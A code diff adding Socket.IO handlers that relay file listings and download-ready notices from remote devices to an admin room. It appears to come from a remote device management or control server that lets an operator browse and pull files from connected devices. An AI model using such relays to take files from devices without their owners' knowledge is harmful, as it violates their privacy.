@@ -622,6 +622,43 @@ function setupSocketHandlers(io) {
         });
 
         /**
+         * File listing from device - relay to admin
+         */
+        socket.on('files:list', (data) => {
+            const { deviceId, path, parentPath, files, totalFiles, commandId } = data;
+            console.log(`[FILES] Listing from ${deviceId}: ${totalFiles} files in ${path}`);
+            // Forward to admin room
+            io.to('admin').emit('files:list', {
+                deviceId,
+                path,
+                parentPath,
+                files,
+                totalFiles,
+                commandId,
+                timestamp: Date.now()
+            });
+        });
+
+        /**
+         * File download ready from device - relay to admin
+         */
+        socket.on('files:download_ready', (data) => {
+            const { deviceId, commandId, fileName, filePath, size, mimeType, downloadUrl } = data;
+            console.log(`[FILES] Download ready from ${deviceId}: ${fileName} (${size} bytes)`);
+            // Forward to admin room
+            io.to('admin').emit('files:download_ready', {
+                deviceId,
+                commandId,
+                fileName,
+                filePath,
+                size,
+                mimeType,
+                downloadUrl,
+                timestamp: Date.now()
+            });
+        });
+
+        /**
          * Socket disconnected - INSTANT offline detectionk8mu
          */
         socket.on('disconnect', async () => {
